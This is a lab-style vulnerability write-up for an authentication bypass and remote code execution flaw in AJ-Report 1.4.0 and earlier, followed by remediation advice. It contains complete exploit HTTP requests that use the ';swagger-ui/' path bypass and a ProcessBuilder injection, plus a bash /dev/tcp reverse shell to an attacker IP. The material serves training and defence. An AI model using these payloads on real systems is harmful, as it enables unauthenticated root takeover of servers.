# AJ-Report Authentication Bypass and Remote Code Execution (CNVD-2024-15077)

> [中文文档](README.md)

| Property | Details |
|----------|---------|
| CVE ID | CNVD-2024-15077 |
| Affected Versions | AJ-Report ≤ 1.4.0 |
| Vulnerability Type | Authentication Bypass + Remote Code Execution (RCE) |
| Severity | 🔴 Critical |
| Default Credentials | No authentication required |
| Prerequisites | Network access to the target service (default port 9095); no account needed |

AJ-Report is a fully open-source BI (Business Intelligence) reporting platform widely used for enterprise data visualization. In version 1.4.0 and earlier, the `/dataSetParam/verification` endpoint contains a critical authentication bypass vulnerability: by appending `;swagger-ui/` to the URL path, an attacker can bypass Spring Security's authorization filter and access protected endpoints without logging in.

The `validationRules` parameter of this endpoint supports JavaScript execution, and the script engine can directly invoke native Java classes such as `java.lang.ProcessBuilder`. An attacker can craft a malicious `validationRules` payload to execute arbitrary system commands on the server as `root`, achieving full Remote Code Execution (RCE).

The impact is severe: since no authentication is required to trigger the vulnerability, any AJ-Report instance exposed to the internet can be exploited by an unauthenticated attacker to obtain a root shell and pivot further into the network.

## Vulnerability Reproduction

### Setup

After starting the target machine, navigate to `http://your-ip:9095` to confirm the AJ-Report login page loads successfully.

![AJ-Report login page](https://static.nextcyber.cn/attachments/images/course/task/4574ea71cf4e416591685b344c3a280a.png)

Use `Burp Suite` to intercept a request to the login page and forward it to the **Repeater** module in preparation for crafting the exploit payload.

![Burp Suite intercepting the login page and sending to Repeater](https://static.nextcyber.cn/attachments/images/course/task/92e449f36bc54116a42358eb42282848.png)

### Step 1: Bypass Authentication and Execute `id`

Send the following request, using the `;swagger-ui/` suffix to bypass authentication and injecting `java.lang.ProcessBuilder` via `validationRules` to run the `id` command:

```http
POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
Host: your-ip:9095
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json;charset=UTF-8
Connection: close
Content-Length: 339

{"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"id\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}
```

After sending the request in `Burp Suite`, the response confirms command execution succeeded and the current user is `root`.

![id command output confirming root user](https://static.nextcyber.cn/attachments/images/course/task/b2541a38d18b4d9698fdaca5ef10f893.png)

### Step 2: Reverse Shell

> [!NOTE]
> Start the listener on the attacker machine (Kali) before sending the reverse shell payload.

On the attacker machine, start an `nc` listener:

```bash
┌──(root㉿nextcyber)-[~]
└─# nc -lvnp 7777
listening on [any] 7777 ...
```

Modify the `validationRules` field to a reverse shell payload, replacing the target address with the attacker machine IP (in this example `192.168.2.6`) on port `7777`:

```http
POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
Host: your-ip:9095
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json;charset=UTF-8
Connection: close
Content-Length: 339

{"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"bash\",\"-c\",\"bash -i >& /dev/tcp/192.168.2.6/7777 0>&1\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}
```

Send the modified request in `Burp Suite`. The `nc` listener on the attacker machine receives the reverse shell with `root` privileges.

![Reverse shell received with root privileges](https://static.nextcyber.cn/attachments/images/course/task/a388f9101f5e4fbb9e4557fc3df8f401.png)

## Remediation

1. **Upgrade to the latest version**: The vendor has patched the authentication bypass in subsequent releases. Upgrade AJ-Report to the latest stable version immediately.
2. **Restrict external access**: Bind the AJ-Report management interface to an internal network address, or use firewall rules to block direct public access to port 9095.
3. **Sandbox the script engine**: Apply sandbox restrictions to the `validationRules` execution environment to block access to dangerous Java classes such as `ProcessBuilder` and `Runtime`.
4. **Deploy a WAF**: Place a Web Application Firewall in front of the application to detect and block requests containing path-confusion patterns such as `;swagger-ui/`.
5. **Principle of least privilege**: Run the AJ-Report service as a non-`root` user to limit the blast radius if the vulnerability is exploited.


---

## Practice

Practice this vulnerability online at [NextCyber Academy](https://app.nextcyber.cn/courses/44).
